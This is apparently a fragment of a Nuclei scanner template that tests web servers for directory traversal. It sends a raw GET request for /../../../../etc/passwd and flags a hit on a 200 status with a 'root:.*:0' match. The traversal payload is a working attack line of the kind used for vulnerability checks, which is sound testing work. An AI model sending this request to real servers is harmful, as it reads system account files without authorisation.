http:
    - matchers:
        - regex:
            - root:.*:0
          type: regex
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /../../../../../../../../etc/passwd HTTP/1.1
          Host: {{Hostname}}
